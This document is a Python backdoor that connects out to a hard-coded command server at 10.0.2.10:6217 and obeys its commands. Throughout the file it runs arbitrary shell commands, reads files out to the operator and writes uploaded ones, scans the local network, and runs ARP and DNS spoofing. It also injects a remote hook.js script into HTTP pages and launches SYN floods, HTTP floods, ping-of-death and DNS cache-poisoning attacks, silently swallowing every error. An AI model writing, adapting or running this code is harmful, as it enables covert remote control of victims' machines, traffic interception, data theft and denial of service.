#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
from functools import partial
from time import sleep
import multiprocessing
from ctypes import c_bool
import scapy.all as scapy
import re
import netfilterqueue
import random

user_agent_list = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
]
garbage = ['c', 'u', 'e', 'n', 'i', 'v', 'd', 'r', '6', 's', '2', 't', '1', 'y', '7']


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Changing working directory to " + path


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful."


def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = brdcast / arp_request
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


def scan(scan_ip, network_results):
    network_results.append([ip[1].psrc for ip in broadcast(scan_ip)])


def network_scanner():
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, i = "0.0.0.0", 0
    while network == "0.0.0.0":
        network, netmask, machine_ip = route[4 + i * 4], route[5 + i * 4], route[7 + i * 4]
        i += 1
    if network and netmask:
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            manager = multiprocessing.Manager()
            network_results = manager.list()
            final = []
            p_processes = []

            for _ in range(0, 5):
                p = multiprocessing.Process(target=scan, args=(scan_ip, network_results))
                p.start()
                p_processes.append(p)
            for process in p_processes:
                process.join()

            for temp in network_results:
                if len(temp) > len(final):
                    final = temp

            try:
                final.remove(machine_ip)
            except ValueError:
                pass

            return final
        except ValueError:
            return
    else:
        return


def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        pass


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)


def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                sleep(2)
        except:
            cleanup(targets, src)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")


def process_packet_dns(packet, target_website, modified_ip):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            try:
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
            except IndexError:
                pass

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def process_packet_hook(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
        load = load.replace("HTTP/1.1", "HTTP/1.0")
        if scapy_packet[scapy.TCP].dport == 80:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
            load = load.replace("</body>", "</body>" + injection_code)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load.decode("utf-8", "ignore"):
            scapy_packet[scapy.Raw].load = load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def dns_spoof(target_website, modified_ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,
               lambda packet, target_website=target_website, modified_ip=modified_ip:
               process_packet_dns(packet, target_website, modified_ip)
               )
    try:
        queue.run()
    except:
        subprocess.run(["iptables", "--flush"])


def hook():
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet_hook)
    try:
        queue.run()
    except:
        subprocess.run(["iptables", "--flush"])


def kill_dns():
    if dns_process.is_alive():
        dns_process.terminate()
        subprocess.run(["iptables", "--flush"])


def kill_hook():
    if hook_process.is_alive():
        hook_process.terminate()
        subprocess.run(["iptables", "--flush"])


def kill_arp():
    if arp_process.is_alive():
        try:
            kill_dns()
        except:
            pass
        try:
            kill_hook()
        except:
            pass
        arp_process.terminate()
        cleanup(selected, router_ip)
        if SYS_PLATFORM == 'linux':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")


def randomize_ip():
    iprange = router_ip.split('.')
    random_ip = iprange[0] + '.' + iprange[1] + '.' + iprange[2] + '.' + str(random.randrange(2, 254))
    return random_ip


def randomize_integer():
    random_int = random.randrange(1, 1024)
    return random_int


def syn_flooding(port, flood_ip, flood_time):
    for _ in range(flood_time):
        ip_packet = scapy.IP()
        ip_packet.src = randomize_ip()
        ip_packet.dst = flood_ip

        tcp_packet = scapy.TCP()
        tcp_packet.sport = randomize_integer()
        tcp_packet.dport = port
        tcp_packet.flags = "S"
        tcp_packet.seq = randomize_integer()
        tcp_packet.window = randomize_integer()
        try:
            scapy.send(ip_packet / tcp_packet, verbose=False)
        except:
            pass


def http_flooding(flood_ip, times):
    for _ in range(times):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((flood_ip, 80))
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: {}\r\n".format(flood_ip).encode())
        s.send("User-Agent: {}\r\n\r\n".format(random.choice(user_agent_list)).encode())
        s.close()


def ping_of_death(flood_ip, times):
    ip_packet = scapy.IP()
    ip_packet.src = randomize_ip()
    ip_packet.dst = flood_ip

    icmp_packet = scapy.ICMP()
    icmp_packet.id = randomize_integer()
    icmp_packet.seq = randomize_integer()

    payload = random.choice(garbage) * 60000

    for _ in range(times):
        try:
            scapy.send(ip_packet / icmp_packet / payload, verbose=False)
        except:
            pass


def create_dns_response(dns_qid, qdsec, ansec, nssec, ip, udp):
    dns = scapy.DNS(id=dns_qid, qr=1, aa=1, rcode=0, qdcount=1, ancount=1, nscount=1,
                    arcount=0, qd=qdsec, an=ansec, ns=nssec, ar=None)
    response = scapy.raw(ip / udp / dns)
    return response


def fake_dns_responses(dns_port, dnsqids, qdsec, ansec, nssec, ip, total_responses):
    udp = scapy.UDP(sport=53, dport=dns_port)
    p = multiprocessing.Pool(8)
    port_responses = p.map(partial(create_dns_response, qdsec=qdsec, ansec=ansec, nssec=nssec, ip=ip, udp=udp), dnsqids)
    p.close()
    p.join()
    total_responses.append([dns_port, port_responses])


def send_dns_requests(dnsPorts, ip, dns, dnsAddr, rawsock):
    for port in dnsPorts:
        udp = scapy.UDP(sport=randomize_integer(), dport=port)
        request = ip / udp / dns
        rawsock.sendto(scapy.raw(request), (dnsAddr, port))


def send_dns_response(response, dnsAddr, port, rawsock):
    rawsock.sendto(response, (dnsAddr, port))


def send_dns_responses_pool(port, port_responses, dnsAddr, rawsock):
    p = multiprocessing.Pool(8)
    p.map(partial(send_dns_response, dnsAddr=dnsAddr, port=port, rawsock=rawsock), port_responses)
    p.close()
    p.join()


class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connected = multiprocessing.Value(c_bool, False)

    def reconnect(self):
        try:
            self.connection.close()
        except:
            pass
        sleep(5)
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port))
            self.connected.value = True
        except:
            self.connected.value = False

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:
                continue

    def run(self):
        while True:
            while not self.connected.value:
                self.reconnect()
            while True:
                try:
                    command = self.reliable_receive()
                    if command[0] == "arpspoof":
                        try:
                            kill_arp()
                        except:
                            pass
                        try:
                            scan_result = network_scanner()
                            if scan_result:
                                global selected
                                global arp_process
                                selected = scan_result
                                arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, router_ip))
                                arp_process.start()
                        except:
                            pass
                    elif command[0] == 'dnsspoof':
                        try:
                            kill_dns()
                        except:
                            pass
                        try:
                            if arp_process and arp_process.is_alive():
                                try:
                                    kill_hook()
                                except:
                                    pass
                                target_website = command[1]
                                modified_ip = command[2]
                                global dns_process
                                dns_process = multiprocessing.Process(target=dns_spoof,
                                                                      args=(target_website, modified_ip))
                                dns_process.start()
                        except:
                            pass
                    elif command[0] == 'hook':
                        try:
                            kill_hook()
                        except:
                            pass
                        try:
                            if arp_process and arp_process.is_alive():
                                try:
                                    kill_dns()
                                except:
                                    pass
                                global hook_process
                                hook_process = multiprocessing.Process(target=hook)
                                hook_process.start()
                        except NameError:
                            pass
                    elif command[0] == "synflood":
                        try:
                            flood_ip = command[1]
                            flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
                            flood_time = int(command[3])
                            pool = multiprocessing.Pool(processes=len(flood_ports))
                            pool.map(partial(syn_flooding, flood_ip=flood_ip, flood_time=flood_time), flood_ports)
                            pool.close()
                            pool.join()
                        except:
                            pass
                    elif command[0] == "httpflood":
                        try:
                            flood_ip = command[1]
                            flood_time = int(command[2])
                            http_flooding(flood_ip, flood_time)
                        except:
                            pass
                    elif command[0] == "pod":
                        try:
                            flood_ip = command[1]
                            flood_time = int(command[2])
                            ping_of_death(flood_ip, flood_time)
                        except:
                            pass
                    elif command[0] == "dnscachepoison":
                        try:
                            spoofDomain = command[1]
                            ns = command[2]
                            nsAddr = command[3]
                            dnsAddr = command[4]
                            query = command[5]
                            dnsPorts = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
                            start = int(command[7])
                            end = int(command[8])
                            if end > 65535:
                                end = 65535
                            dnsQids = list(range(start, end+1))
                            badAddr = "10.0.2.10"

                            ip = scapy.IP(src=nsAddr, dst=dnsAddr)
                            qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
                            ansec = scapy.DNSRR(rrname=ns, type="A", rclass="IN", ttl=60000, rdata=badAddr)
                            nssec = scapy.DNSRR(rrname=spoofDomain, type="NS", rclass="IN", ttl=60000, rdata=ns)

                            p_processes = []
                            manager = multiprocessing.Manager()
                            total_responses = manager.list()
                            for port in dnsPorts:
                                p = multiprocessing.Process(target=fake_dns_responses,
                                                            args=(port, dnsQids, qdsec, ansec,
                                                                  nssec, ip, total_responses))
                                p.start()
                                p_processes.append(p)
                            for process in p_processes:
                                process.join()

                            rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                            rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)

                            ip = scapy.IP(src=randomize_ip(), dst=dnsAddr)
                            qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
                            dns = scapy.DNS(id=randomize_integer(), qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0,
                                            nscount=0, arcount=0, qd=qdsec)
                            sending_requests = multiprocessing.Process(target=send_dns_requests,
                                                                       args=(dnsPorts, ip, dns, dnsAddr, rawsock))

                            sending_fake_responses_processes = []
                            for port_responses in total_responses:
                                port = port_responses[0]
                                p = multiprocessing.Process(target=send_dns_responses_pool,
                                                            args=(port, port_responses[1], dnsAddr, rawsock))
                                sending_fake_responses_processes.append(p)

                            sending_requests.start()
                            for process in sending_fake_responses_processes:
                                process.start()

                            sending_requests.join()
                            for process in sending_fake_responses_processes:
                                process.join()
                        except:
                            pass
                    elif command[0] == "killarp":
                        try:
                            kill_arp()
                        except:
                            pass
                    elif command[0] == "killdns":
                        try:
                            kill_dns()
                        except:
                            pass
                    elif command[0] == "killhook":
                        try:
                            kill_hook()
                        except:
                            pass
                    else:
                        try:
                            if command[0] == "exit":
                                pass
                            elif command[0] == "killconnection":
                                self.connected.value = False
                                break
                            elif command[0] == "PING":
                                command_result = "PONG"
                            elif command[0] == "cd" and len(command) > 1:
                                command_result = change_working_directory_to(command[1])
                            elif command[0] == "download":
                                command_result = read_file(command[1])
                            elif command[0] == "upload":
                                command_result = write_file(command[1], command[2])
                            else:
                                command_result = execute_system_command(command)
                        except:
                            command_result = "[-] Error during command execution."
                        self.reliable_send(command_result)
                except OSError:
                    self.connected.value = False
                    break


try:
    SYS_PLATFORM = sys.platform
    selected = []
    arp_process = None
    dns_process = None
    hook_process = None
    router_ip = scapy.conf.route.route("0.0.0.0")[2]
    my_backdoor = Backdoor("10.0.2.10", 6217)
    my_backdoor.run()
except:
    sys.exit()
